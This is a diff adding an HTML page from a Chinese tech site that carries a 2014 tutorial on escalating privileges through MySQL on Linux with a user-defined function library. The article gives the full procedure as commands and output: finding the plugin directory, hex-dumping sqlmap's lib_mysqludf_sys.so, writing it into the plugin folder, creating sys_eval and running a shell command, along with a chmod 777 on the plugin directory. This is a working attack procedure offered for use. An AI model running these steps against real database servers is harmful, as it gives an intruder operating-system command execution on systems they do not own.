@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="x-dns-prefetch-control" content="on" />
+<link rel="dns-prefetch" href="https://img.jbzj.com/" />
+<link rel="dns-prefetch" href="https://icws.jb51.net/" />
+<link rel="dns-prefetch" href="https://files.jb51.net/" />
+<meta name="applicable-device" content="pc">
+<meta name="renderer" content="webkit" />
+<meta name="force-rendering" content="webkit" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<title>Linux利用UDF库实现Mysql提权_Mysql_脚本之家</title>
+<meta name="keywords" content="Linux,mysql提权" />
+<meta name="description" content="根据MySQL函数族的可扩展机制，意味着用户可以自己建立包含有自定义函数的动态库来创建自定义函数，简称udf" />
+<link rel="alternate" media="only screen and(max-width: 640px)" href="https://m.jb51.net/article/51767.htm" />
+<meta http-equiv="mobile-agent" content="format=html5; url=https://m.jb51.net/article/51767.htm" />
+<meta http-equiv="mobile-agent" content="format=xhtml; url=https://m.jb51.net/article/51767.htm" />
+<script type="text/javascript">
+    var tougao = "hebedich",lmname = "Mysql",suoyin = "no",dxycms="ok";
+    (function() {
+        if (/Android|webOS|iPhone|iPad|Windows Phone|iPod|BlackBerry|SymbianOS|Nokia|Mobile|Opera Mini/i.test(navigator.userAgent)) {
+            var siteName = window.location.pathname,url = window.location.href;
+            if (url.indexOf("?pc") < 0) {
+                try {
+                    if (typeof siteName !== "undefined") {
+                        window.location.href = "https://m.jb51.net" + siteName
+                    }
+                } catch (e) {}
+            }
+        }
+    })();
+</script>
+<meta name="referrer" content="always">
+<link type="text/css" href="https://www.jb51.net/skin/2019/css/article.css" rel="stylesheet" />
+<link type="text/css" href="https://cdn.staticfile.org/viewerjs/1.11.2/viewer.min.css" rel="stylesheet" />
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.11.3/jquery.min.js"></script>
+<script type="text/javascript">
+    if (typeof jQuery == 'undefined') {
+        document.write(unescape("%3Cscript src='/skin/js/jquery.js' type='text/javascript'%3E%3C/script%3E"));
+    }
+</script>
+<script type="text/javascript" src="https://www.jb51.net/js/common.js"></script>
+</head>
+
+<body>
+    <!--topTools Start -->
+    <div id="topbar">
+        <div id="wrap">
+            <div class="topbarleft">
+                <a href="https://www.jb51.net/" target="_blank">脚本之家</a>
+                <a href="http://s.jb51.net" target="_blank" rel="nofollow">服务器常用软件</a>
+            </div>
+            <div class="fr">
+                <ul>
+                    <li><i class="ico-mobile"></i><a target="_blank" href="https://m.jb51.net/" rel="nofollow">手机版</a></li>
+                    <li><i class="ico-contribute"></i><a href="http://tougao.jb51.net" rel="nofollow" target="_blank">投稿中心</a></li>
+                    <li id="wxHide"><i class="ico-wechat"></i><a href="javascript:void(0)" target="_blank">关注微信</a>
+                        <div id="wxShow" class="wxHide_box"><img src="https://img.jbzj.com/skin/2018/images/erwm.jpg" alt="扫一扫" width="84" hight="84" data-baiduimageplus-ignore></div>
+                    </li>
+                </ul>
+                <!--快捷导航 开始 -->
+                <div class="text_d right" id="navHide">
+                    <a rel="nofollow" href="javascript:void(0);">快捷导航 <i class="arrowright"></i></a>
+                    <div id="navBox" class="nwebnav">
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="https://www.jb51.net/softs/" target="_blank">软件下载</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/softs/android.html" target="_blank">android</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/softs/mac.html" target="_blank">MAC</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/qudong/" target="_blank">驱动下载</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/fonts/" target="_blank">字体下载</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/dll/" target="_blank">DLL</a>
+                                </dd>
+                            </dl>
+                        </div>
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="https://www.jb51.net/codes/" target="_blank">源码下载</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/codes/php.html" target="_blank">PHP</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/codes/aspnet.html" target="_blank">ASP.NET</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/codes/asp.html" target="_blank">ASP</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/codes/jsp.html" target="_blank">JSP</a>
+                                </dd>
+                            </dl>
+                        </div>
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="https://www.jb51.net/list/index_84.htm" target="_blank">软件编程</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_85_1.htm" target="_blank">C#</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_134_1.htm" target="_blank">JAVA</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_159_1.htm" target="_blank">C 语言</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_206_1.htm" target="_blank">Delphi</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_233_1.htm" target="_blank">Android</a>
+                                </dd>
+                            </dl>
+                        </div>
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="https://www.jb51.net/list/index_1.htm" target="_blank">网络编程</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_15_1.htm" target="_blank">PHP</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_21_1.htm" target="_blank">ASP.NET</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_2_1.htm" target="_blank">ASP</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_3_1.htm" target="_blank">JavaScript</a>
+                                </dd>
+                            </dl>
+                        </div>
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="http://tools.jb51.net/" target="_blank">在线工具</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/tools/cssyasuo.shtml" target="_blank">CSS格式化</a>
+                                    <a rel="nofollow" href="http://tools.jb51.net/tools/js_geshihua.asp" target="_blank">JS格式化</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/tools/html-js.htm" target="_blank">Html转化为Js</a>
+                                </dd>
+                            </dl>
+                        </div>
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="https://www.jb51.net/list/index_104.htm" target="_blank">数据库</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_112_1.htm" target="_blank">MYSQL</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_113_1.htm" target="_blank">MSSQL</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_154_1.htm" target="_blank">oracle</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_155_1.htm" target="_blank">DB2</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/list/list_252_1.htm" target="_blank">MARIADB</a>
+                                </dd>
+                            </dl>
+                        </div>
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="https://www.jb51.net/cms/" target="_blank">CMS</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/cms/list411_1.html" target="_blank">PHPCMS</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/cms/list408_1.html" target="_blank">DEDECMS</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/cms/list578_1.html" target="_blank">帝国CMS</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/cms/list419_1.html" target="_blank">WordPress</a>
+                                </dd>
+                            </dl>
+                        </div>
+                        <div class="ndeallist clear_fix">
+                            <h4><a rel="nofollow" href="javascript:0;" target="_blank">常用工具</a></h4>
+                            <dl>
+                                <dd>
+                                    <a rel="nofollow" href="https://www.jb51.net/zt/phphuanjing.html" target="_blank">PHP开发工具</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/zt/python.html" target="_blank">python</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/zt/photoshopxz.html" target="_blank">Photoshop</a>
+                                    <a rel="nofollow" href="https://www.jb51.net/bibei/win/index.html" target="_blank">必备软件</a>
+                                </dd>
+                            </dl>
+                        </div>
+                    </div>
+                </div>
+                <!--快捷导航 结束 -->
+            </div>
+        </div>
+    </div>
+    <!--topTools end -->
+
+    <div id="header">
+        <!-- Logo start -->
+        <div id="logo"><a href="https://www.jb51.net/"><img src="https://www.jb51.net/images/logo.gif" title="脚本之家" alt="脚本之家" /></a></div>
+        <div class="logom fl"><span id="logo_m" class="jbTestPos"></span></div>
+        <div class="logor fr"><span id="logo_r" class="jbTestPos"></span></div>
+        <!--Logo end -->
+    </div>
+    <!--Logo end -->
+
+    <!-- 导航开始 -->
+    <div id="nav">
+        <ul>
+            <li><a href="https://www.jb51.net/">网站首页</a></li>
+            <li><a href="https://www.jb51.net/web/">网页制作</a></li>
+            <li><a href="https://www.jb51.net/list/index_1.htm">网络编程</a></li>
+            <li><a href="https://www.jb51.net/list/index_96.htm">脚本专栏</a></li>
+            <li><a href="https://www.jb51.net/jiaoben/">脚本下载</a></li>
+            <li><a href="https://www.jb51.net/list/index_104.htm">数据库</a></li>
+            <li><a href="https://www.jb51.net/list/list_82_1.htm">服务器</a></li>
+            <li><a href="https://www.jb51.net/books/">电子书籍</a></li>
+            <li><a href="https://www.jb51.net/os/">操作系统</a></li>
+            <li><a href="https://www.jb51.net/yunying/">网站运营</a></li>
+            <li><a href="https://www.jb51.net/pingmian/">平面设计</a></li>
+            <li>
+                <p><i>其它</i><span>
+                        <a href="https://www.jb51.net/media/">媒体动画</a>
+                        <a href="https://www.jb51.net/diannaojichu/">电脑基础</a>
+                        <a href="https://www.jb51.net/hardware/">硬件教程</a>
+                        <a href="https://www.jb51.net/hack/">网络安全</a>
+                    </span></p>
+            </li>
+        </ul>
+    </div>
+    <!--导航结束-->
+
+    <!-- 二级菜单开始 -->
+    <div id="submenu">
+        <div class="subnav clearfix">
+            <ul><li><a href='https://www.jb51.net/list/list_113_1.htm' title="MsSql">MsSql</a></li>
+<li><a href='https://www.jb51.net/list/list_112_1.htm' title="Mysql">Mysql</a></li>
+<li><a href='https://www.jb51.net/list/list_252_1.htm' title="mariadb">mariadb</a></li>
+<li><a href='https://www.jb51.net/list/list_154_1.htm' title="oracle">oracle</a></li>
+<li><a href='https://www.jb51.net/list/list_155_1.htm' title="DB2">DB2</a></li>
+<li><a href='https://www.jb51.net/list/list_236_1.htm' title="mssql2008">mssql2008</a></li>
+<li><a href='https://www.jb51.net/list/list_210_1.htm' title="mssql2005">mssql2005</a></li>
+<li><a href='https://www.jb51.net/list/list_215_1.htm' title="SQLite">SQLite</a></li>
+<li><a href='https://www.jb51.net/list/list_224_1.htm' title="PostgreSQL">PostgreSQL</a></li>
+<li><a href='https://www.jb51.net/list/list_239_1.htm' title="MongoDB">MongoDB</a></li>
+<li><a href='https://www.jb51.net/list/list_242_1.htm' title="Redis">Redis</a></li>
+<li><a href='https://www.jb51.net/list/list_105_1.htm' title="Access">Access</a></li>
+<li><a href='https://www.jb51.net/list/list_132_1.htm' title="数据库文摘">数据库文摘</a></li>
+<li><a href='https://www.jb51.net/list/list_133_1.htm' title="数据库其它">数据库其它</a></li>
+</ul>
+        </div>
+    </div>
+    <!-- 二级菜单结束 -->
+
+    <!--content Star -->
+    <div id="wrapper">
+        <div id="container">
+            <div class="pt10 clearfix">
+                <div class="clearfix"><span id="tonglan1" class="jbTestPos"></span></div>
+            </div>
+
+            <div class="clearfix">
+                <div class="breadcrumb">
+                    <i class="ico-path"></i>您的位置：<a href='https://www.jb51.net/'>首页</a> → <a href="https://www.jb51.net/list/index_104.htm" title="数据库">数据库</a> → <a href="https://www.jb51.net/list/list_112_1.htm" title="Mysql">Mysql</a> → Linux利用UDF库实现Mysql提权
+                </div>
+                <div class="search">
+                    <form action="https://www.jb51.net/do/search.php" target="_blank">
+                        <input type="hidden" name="s" value="10520733385329581432">
+                        <input type="hidden" name="ie" value="utf-8">
+                        <input type="text" name="q" class="searchinput" placeholder="请输入关键词">
+                        <input type="submit" value=" " class="search-button">
+                    </form>
+                </div>
+            </div>
+
+            <div id="main" class="clearfix">
+                <div class="main-left">
+                    <div id="article">
+                        <h1 class="title">Linux利用UDF库实现Mysql提权</h1>
+                        <div class="info"> &nbsp;更新时间：2014年07月02日 15:36:09 &nbsp; 投稿：hebedich &nbsp; </div>
+                        <div class="lbd clearfix"><span id="tit_down" class="jbTestPos"></span></div>
+                        <div class="summary">根据MySQL函数族的可扩展机制，意味着用户可以自己建立包含有自定义函数的动态库来创建自定义函数，简称udf</div>
+                        <div class="lbd clearfix"><span id="art_up" class="jbTestPos"></span></div>
+                        <div id="content">
+                            <p>环境:<br />
+os:linux(bt5)<br />
+&nbsp;<br />
+database:mysql<br />
+&nbsp;<br />
+简述：<br />
+通过自定义库函数来实现执行任意的程序，这里只在linux下测试通过，具体到windows，所用的dll自然不同。<br />
+&nbsp;<br />
+要求：<br />
+&nbsp;在mysql库下必须有func表，并且在&#8209;&#8209;skip&#8209;grant&#8209;tables开启的情况下，UDF会被禁止；<br />
+&nbsp;<br />
+过程： 得到插件库路径 找对应操作系统的udf库文件 利用udf库文件加载函数并执行命令</p>
+<p>１，得到插件库路径</p>
+<div class="jb51code">
+<pre class="brush:bash;">
+mysql&gt; show variables like "%plugin%";
++---------------+-----------------------+
+| Variable_name | Value         |
++---------------+-----------------------+
+| plugin_dir  | /usr/lib/mysql/plugin |
++---------------+-----------------------+
+1 row in set (0.00 sec)
+</pre>
+</div>
+<p>２，找对应操作系统的udf库文件<br />
+因为自己测试，看了下自己系统的版本，64位<br />
+&nbsp;<br />
+</p>
+<div class="jb51code">
+<pre class="brush:bash;">
+root@bt:~# uname -a
+Linux bt 3.2.6 #1 SMP Fri Feb 17 10:34:20 EST 2012 x86_64 GNU/Linux
+</pre>
+</div>
+<p>&nbsp;<br />
+对于udf文件，在sqlmap工具中自带就有，只要找对应操作系统的版本即可</p>
+<div class="jb51code">
+<pre class="brush:bash;">
+root@bt:/pentest/database/sqlmap/udf/mysql# ls
+linux windows
+root@bt:/pentest/database/sqlmap/udf/mysql/linux# ls
+32 64
+root@bt:/pentest/database/sqlmap/udf/mysql/linux/64# ls
+lib_mysqludf_sys.so
+</pre>
+</div>
+<p>３，利用udf库文件加载函数并执行命令<br />
+首先要得到udf库文件的十六进制格式，可在本地通过<br />
+&nbsp;<br />
+</p>
+<div class="jb51code">
+<pre class="brush:bash;">
+mysql&gt; select hex(load_file('/pentest/database/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt';
+Query OK, 1 row affected (0.04 sec)
+</pre>
+</div>
+<p>&nbsp;<br />
+因为我测试时，使用自带账户，账户名mysql，并不是root,所以插件目录不可写，而实际中，一般udf提权都是用root权限启动的mysql程序，故，不存在目录权限不足，不能访问的情况。为了继续，修改目录权限<br />
+&nbsp;<br />
+<a href="mailto:root@bt">root@bt</a>:~# chmod 777 /usr/lib/mysql/plugin<br />
+&nbsp;<br />
+数据库中写入udf库到mysql库目录:<br />
+&nbsp;<br />
+</p>
+<div class="jb51code">
+<pre class="brush:bash;">
+mysql&gt; select unhex('7F454C46020...') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
+Query OK, 1 row affected (0.04 sec)
+</pre>
+</div>
+<p>&nbsp;<br />
+查看下这个udf库所支持的函数</p>
+<div class="jb51code">
+<pre class="brush:bash;">
+root@bt:~# nm -D /usr/lib/mysql/plugin/mysqludf.so
+         w _Jv_RegisterClasses
+0000000000201788 A __bss_start
+         w __cxa_finalize
+         w __gmon_start__
+0000000000201788 A _edata
+0000000000201798 A _end
+0000000000001178 T _fini
+0000000000000ba0 T _init
+         U fgets
+         U fork
+         U free
+         U getenv
+000000000000101a T lib_mysqludf_sys_info
+0000000000000da4 T lib_mysqludf_sys_info_deinit
+0000000000001047 T lib_mysqludf_sys_info_init
+         U malloc
+         U mmap
+         U pclose
+         U popen
+         U realloc
+         U setenv
+         U strcpy
+         U strncpy
+0000000000000dac T sys_bineval
+0000000000000dab T sys_bineval_deinit
+0000000000000da8 T sys_bineval_init
+0000000000000e46 T sys_eval
+0000000000000da7 T sys_eval_deinit
+0000000000000f2e T sys_eval_init
+0000000000001066 T sys_exec
+0000000000000da6 T sys_exec_deinit
+0000000000000f57 T sys_exec_init
+00000000000010f7 T sys_get
+0000000000000da5 T sys_get_deinit
+0000000000000fea T sys_get_init
+000000000000107a T sys_set
+00000000000010e8 T sys_set_deinit
+0000000000000f80 T sys_set_init
+         U sysconf
+         U system
+         U waitpid
+</pre>
+</div>
+<p>最后，加载函数并执行：</p>
+<div class="jb51code">
+<pre class="brush:bash;">
+mysql&gt; create function sys_eval returns string soname "mysqludf.so";
+Query OK, 0 rows affected (0.14 sec)
+ 
+mysql&gt; select sys_eval('whoami');
++--------------------+
+| sys_eval('whoami') |
++--------------------+
+| mysql       |
++--------------------+
+1 row in set (0.04 sec)
+ 
+mysql&gt; select * from mysql.func;
++----------+-----+-------------+----------+
+| name   | ret | dl     | type   |
++----------+-----+-------------+----------+
+| sys_eval |  0 | mysqludf.so | function |
++----------+-----+-------------+----------+
+1 row in set
+</pre>
+</div>
+<p></p>
+                            
+                            <div class="art_xg">
+                                <b>您可能感兴趣的文章:</b><ul><li><a href=https://www.jb51.net/article/278554.htm title="Window环境下MySQL UDF提权" target="_blank">Window环境下MySQL UDF提权</a></li></ul>
+                            </div>
+
+                        </div>
+                        <!--endmain-->
+                        <div class="lbd_bot clearfix">
+                            <span id="art_bot" class="jbTestPos"></span>
+                        </div>
+                        <div class="tags clearfix">
+                            <i class="icon-tag"></i>
+                            <ul class="meta-tags">
+                                <li class="tag item"><a href="http://common.jb51.net/tag/Linux/1.htm" target="_blank" title="搜索关于Linux的文章" rel="nofollow">Linux</a></li>
+<li class="tag item"><a href="http://common.jb51.net/tag/mysql%E6%8F%90%E6%9D%83/1.htm" target="_blank" title="搜索关于mysql提权的文章" rel="nofollow">mysql提权</a></li>
+
+                            </ul>
+                        </div>
+                        <div class="lbd clearfix">
+                            <span id="art_down" class="jbTestPos"></span>
+                        </div>
+                        <div id="shoucang"></div>
+                        <div class="xgcomm clearfix">
+                            <h2>相关文章</h2>
+                            <ul><li class="lbd clearfix"><span id="art_xg" class="jbTestPos"></span></li><li><div class="item-inner"><a href=https://www.jb51.net/database/285534wel.htm title="MySQL常用登录命令小结" class="img-wrap" target="_blank"> <img alt="MySQL常用登录命令小结" src="https://img.jbzj.com/images/xgimg/bcimg0.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/database/285534wel.htm title="MySQL常用登录命令小结">MySQL常用登录命令小结</a></p><div class="item-info"><div class="js">本文主要介绍了MySQL常用登录命令小结，文中通过示例代码介绍的非常详细，对大家的学习或者工作具有一定的参考学习价值，需要的朋友们下面随着小编来一起学习学习吧</div><span class="lbtn" style="float:right"> 2023-05-05 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/262095.htm title="MySQL之my.cnf配置文件图文详解" class="img-wrap" target="_blank"> <img alt="MySQL之my.cnf配置文件图文详解" src="https://img.jbzj.com/images/xgimg/bcimg1.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/262095.htm title="MySQL之my.cnf配置文件图文详解">MySQL之my.cnf配置文件图文详解</a></p><div class="item-info"><div class="js">my.cnf是mysql启动时加载的配置文件,一般会放在mysql的安装目录中,用户也可以放在其他目录加载,下面这篇文章主要给大家介绍了关于MySQL之my.cnf配置文件的相关资料,需要的朋友可以参考下</div><span class="lbtn" style="float:right"> 2022-09-09 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/209270.htm title="mysql查询的控制语句图文详解" class="img-wrap" target="_blank"> <img alt="mysql查询的控制语句图文详解" src="https://img.jbzj.com/images/xgimg/bcimg2.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/209270.htm title="mysql查询的控制语句图文详解">mysql查询的控制语句图文详解</a></p><div class="item-info"><div class="js">这篇文章主要给大家介绍了关于mysql查询控制语句的相关资料，文中通过示例代码介绍的非常详细，对大家的学习或者工作具有一定的参考学习价值，需要的朋友们下面随着小编来一起学习学习吧</div><span class="lbtn" style="float:right"> 2021-04-04 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/242618.htm title="使用canal监控mysql数据库实现elasticsearch索引实时更新问题" class="img-wrap" target="_blank"> <img alt="使用canal监控mysql数据库实现elasticsearch索引实时更新问题" src="https://img.jbzj.com/images/xgimg/bcimg3.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/242618.htm title="使用canal监控mysql数据库实现elasticsearch索引实时更新问题">使用canal监控mysql数据库实现elasticsearch索引实时更新问题</a></p><div class="item-info"><div class="js">这篇文章主要介绍了使用canal监控mysql数据库实现elasticsearch索引实时更新,本文给大家介绍的非常详细，对大家的学习或工作具有一定的参考借鉴价值，需要的朋友可以参考下</div><span class="lbtn" style="float:right"> 2022-03-03 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/38288.htm title="探讨:sql插入空,默认1900-01-01 00:00:00.000的解决方法详解" class="img-wrap" target="_blank"> <img alt="探讨:sql插入空,默认1900-01-01 00:00:00.000的解决方法详解" src="https://img.jbzj.com/images/xgimg/bcimg4.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/38288.htm title="探讨:sql插入空,默认1900-01-01 00:00:00.000的解决方法详解">探讨:sql插入空,默认1900-01-01 00:00:00.000的解决方法详解</a></p><div class="item-info"><div class="js">本篇文章是对sql插入空,默认1900-01-01 00:00:00.000的解决方法进行了详细的分析介绍，需要的朋友参考下</div><span class="lbtn" style="float:right"> 2013-06-06 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/218801.htm title="SQL实现LeetCode(180.连续的数字)" class="img-wrap" target="_blank"> <img alt="SQL实现LeetCode(180.连续的数字)" src="https://img.jbzj.com/images/xgimg/bcimg5.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/218801.htm title="SQL实现LeetCode(180.连续的数字)">SQL实现LeetCode(180.连续的数字)</a></p><div class="item-info"><div class="js">这篇文章主要介绍了SQL实现LeetCode(180.连续的数字),本篇文章通过简要的案例,讲解了该项技术的了解与使用,以下就是详细内容,需要的朋友可以参考下</div><span class="lbtn" style="float:right"> 2021-08-08 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/110395.htm title="mysql 查看当前使用的配置文件my.cnf的方法(推荐)" class="img-wrap" target="_blank"> <img alt="mysql 查看当前使用的配置文件my.cnf的方法(推荐)" src="https://img.jbzj.com/images/xgimg/bcimg6.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/110395.htm title="mysql 查看当前使用的配置文件my.cnf的方法(推荐)">mysql 查看当前使用的配置文件my.cnf的方法(推荐)</a></p><div class="item-info"><div class="js">下面小编就为大家带来一篇mysql 查看当前使用的配置文件my.cnf的方法(推荐)。小编觉得挺不错的，现在就分享给大家，也给大家做个参考。一起跟随小编过来看看吧</div><span class="lbtn" style="float:right"> 2017-04-04 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/38431.htm title="如何解决mysqlimport: Error: 13, Can''t get stat of 的问题" class="img-wrap" target="_blank"> <img alt="如何解决mysqlimport: Error: 13, Can''t get stat of 的问题" src="https://img.jbzj.com/images/xgimg/bcimg7.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/38431.htm title="如何解决mysqlimport: Error: 13, Can''t get stat of 的问题">如何解决mysqlimport: Error: 13, Can''t get stat of 的问题</a></p><div class="item-info"><div class="js">本篇文章是对解决mysqlimport: Error: 13, Can't get stat of问题的方法进行了详细的分析介绍，需要的朋友参考下</div><span class="lbtn" style="float:right"> 2013-06-06 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/266960.htm title="MySQL创建数据库和创建数据表的操作过程" class="img-wrap" target="_blank"> <img alt="MySQL创建数据库和创建数据表的操作过程" src="https://img.jbzj.com/images/xgimg/bcimg8.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/266960.htm title="MySQL创建数据库和创建数据表的操作过程">MySQL创建数据库和创建数据表的操作过程</a></p><div class="item-info"><div class="js">MySQL 是最常用的数据库，在数据库操作中，基本都是增删改查操作，简称CRUD，这篇文章主要介绍了MySQL创建数据库和创建数据表的操作过程,需要的朋友可以参考下</div><span class="lbtn" style="float:right"> 2022-11-11 </span></div></div></div></div></li>
+<li><div class="item-inner"><a href=https://www.jb51.net/article/259051.htm title="SQL数据分表Mybatis Plus动态表名优方案" class="img-wrap" target="_blank"> <img alt="SQL数据分表Mybatis Plus动态表名优方案" src="https://img.jbzj.com/images/xgimg/bcimg9.png"> </a><div class="rbox"><div class="rbox-inner"><p><a class="link title" target="_blank" href=https://www.jb51.net/article/259051.htm title="SQL数据分表Mybatis Plus动态表名优方案">SQL数据分表Mybatis Plus动态表名优方案</a></p><div class="item-info"><div class="js">这篇文章主要介绍了SQL数据分表Mybatis Plus动态表名优方案，文章围绕主题展开详细的内容介绍，具有一定的参考价值，需要的小伙伴可以参考一下</div><span class="lbtn" style="float:right"> 2022-08-08 </span></div></div></div></div></li>
+</ul>
+                        </div>
+                        <div class="lbd clearfix mt5">
+                            <span id="art_down2" class="jbTestPos"></span>
+                        </div>
+                        <a href="#comments"></a>
+                        <div id="comments">
+                            <h2>最新评论</h2>
+                            <div class="pd5">
+                                <div id="SOHUCS" sid="art_51767"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <!--endborder-->
+                </div>
+                <!--end fl-->
+
+                <div class="main-right">
+                    <div id="sidebar-right">
+                        <div class="r300 clearfix"><span id="side_up" class="jbTestPos"></span></div>
+                        <div class="sidebox-recomm"></div>
+                        <div class="r300 clearfix"><span id="zbafer" class="jbTestPos"></span></div>
+                        <div class="sidebox bor-blue">
+                            <div class="bor-default pb10">
+                                <h4 class="blue">大家感兴趣的内容</h4>
+                                <ul class="newsList newList-in">
+                                    <li><EM class="no1">1</EM><a href=https://www.jb51.net/article/23876.htm title="mysql安装图解 mysql图文安装教程(详细说明)" target="_blank">mysql安装图解 mysql图文安装教程(详细说明)</a></li><li><EM class="no2">2</EM><a href=https://www.jb51.net/article/26505.htm title="Can''''t connect to MySQL server on localhost (10061)解决方法" target="_blank">Can''''t connect to MySQL serv</a></li><li><EM class="no3">3</EM><a href=https://www.jb51.net/article/39188.htm title="windows下MySQL5.6版本安装及配置过程附有截图和详细说明" target="_blank">windows下MySQL5.6版本安装及配置过程附有截图和</a></li><li><EM class="no4">4</EM><a href=https://www.jb51.net/article/51794.htm title="mysql之TIMESTAMP（时间戳）用法详解" target="_blank">mysql之TIMESTAMP（时间戳）用法详解</a></li><li><EM class="no5">5</EM><a href=https://www.jb51.net/article/27458.htm title="Mysql字符串截取函数SUBSTRING的用法说明" target="_blank">Mysql字符串截取函数SUBSTRING的用法说明</a></li><li><EM class="no6">6</EM><a href=https://www.jb51.net/article/48625.htm title="MySQL提示:The server quit without updating PID file问题的解决办法" target="_blank">MySQL提示:The server quit withou</a></li><li><EM class="no7">7</EM><a href=https://www.jb51.net/article/31850.htm title="MySQL创建用户与授权方法" target="_blank">MySQL创建用户与授权方法</a></li><li><EM class="no8">8</EM><a href=https://www.jb51.net/article/36370.htm title="Mysql查看版本号的几种方式" target="_blank">Mysql查看版本号的几种方式</a></li><li><EM class="no9">9</EM><a href=https://www.jb51.net/article/39454.htm title="MySQL——修改root密码的4种方法(以windows为例)" target="_blank">MySQL——修改root密码的4种方法(以windows为</a></li><li><EM class="no10">10</EM><a href=https://www.jb51.net/article/23966.htm title="MySQL日期数据类型、时间类型使用总结" target="_blank">MySQL日期数据类型、时间类型使用总结</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="r300 clearfix mt10"><span id="idctu" class="jbTestPos"></span></div>
+                        <div class="sidebox bor-blue">
+                            <div class="bor-default pb10">
+                                <h4 class="blue">最近更新的内容</h4>
+                                <ul class="newsListA">
